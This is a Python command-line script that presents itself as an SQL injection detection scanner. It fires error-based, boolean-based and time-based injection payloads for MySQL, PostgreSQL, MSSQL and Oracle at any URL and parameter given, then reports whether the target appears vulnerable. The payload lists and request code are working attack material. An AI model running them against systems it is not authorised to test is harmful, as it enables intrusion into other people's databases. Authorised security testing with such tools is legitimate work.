#!/usr/bin/env python3
"""SQL Injection Detection Scanner"""
import argparse
import requests
import urllib.parse
import json
import time
from typing import List, Dict

class SQLiScanner:
    TIMING_PAYLOADS = {
        'mysql': "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
        'postgresql': "1'; SELECT pg_sleep(2)-- -",
        'mssql': "1'; WAITFOR DELAY '0:0:2'-- -",
        'oracle': "1' AND 8026=DBMS_PIPE.RECEIVE_MESSAGE('xyz',2)-- -",
    }

    BOOLEAN_PAYLOADS = [
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1'' AND 1=1-- -",
        "1'' AND 1=2-- -",
        '" AND "1"="1',
        '" AND "1"="2',
    ]

    ERROR_PAYLOADS = [
        "'",
        "\"",
        "1'",
        "1' UNION SELECT 1-- -",
        "1' UNION SELECT 1,2,3-- -",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -",
    ]

    def __init__(self, target_url: str, param: str, method: str = 'GET'):
        self.target_url = target_url
        self.param = param
        self.method = method.upper()
        self.findings = []

    def send_request(self, payload: str) -> requests.Response:
        params = {self.param: payload}
        if self.method == 'GET':
            return requests.get(self.target_url, params=params, timeout=10)
        elif self.method == 'POST':
            return requests.post(self.target_url, data=params, timeout=10)

    def test_error_based(self) -> List[Dict]:
        results = []
        for payload in self.ERROR_PAYLOADS:
            try:
                resp = self.send_request(payload)
                errors = ['sql', 'mysql', 'syntax', 'unexpected', 'odbc', 'ora-']
                for error in errors:
                    if error.lower() in resp.text.lower():
                        results.append({
                            'type': 'error_based',
                            'payload': payload,
                            'error': error,
                            'status_code': resp.status_code
                        })
                        break
            except:
                pass
        return results

    def test_boolean_based(self) -> List[Dict]:
        results = []
        for i in range(0, len(self.BOOLEAN_PAYLOADS), 2):
            try:
                resp_true = self.send_request(self.BOOLEAN_PAYLOADS[i])
                resp_false = self.send_request(self.BOOLEAN_PAYLOADS[i+1])
                len_true = len(resp_true.text)
                len_false = len(resp_false.text)
                if abs(len_true - len_false) > 10 or resp_true.status_code != resp_false.status_code:
                    results.append({
                        'type': 'boolean_based',
                        'payload_true': self.BOOLEAN_PAYLOADS[i],
                        'payload_false': self.BOOLEAN_PAYLOADS[i+1],
                        'difference': abs(len_true - len_false)
                    })
            except:
                pass
        return results

    def test_time_based(self) -> List[Dict]:
        results = []
        baseline = time.time()
        try:
            self.send_request("1")
            baseline_time = time.time() - baseline
        except:
            baseline_time = 0.5

        for dbms, payload in self.TIMING_PAYLOADS.items():
            try:
                start = time.time()
                self.send_request(payload)
                elapsed = time.time() - start
                if elapsed > baseline_time + 1.5:
                    results.append({
                        'type': 'time_based',
                        'dbms': dbms,
                        'payload': payload,
                        'delay': round(elapsed, 2)
                    })
            except:
                pass
        return results

    def scan(self) -> Dict:
        findings = {
            'url': self.target_url,
            'param': self.param,
            'method': self.method,
            'error_based': self.test_error_based(),
            'boolean_based': self.test_boolean_based(),
            'time_based': self.test_time_based(),
        }
        findings['vulnerable'] = any(len(v) > 0 for v in [findings['error_based'], findings['boolean_based'], findings['time_based']])
        return findings

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--param', required=True)
    parser.add_argument('--method', default='GET')
    args = parser.parse_args()
    scanner = SQLiScanner(args.url, args.param, args.method)
    print(json.dumps(scanner.scan(), indent=2))
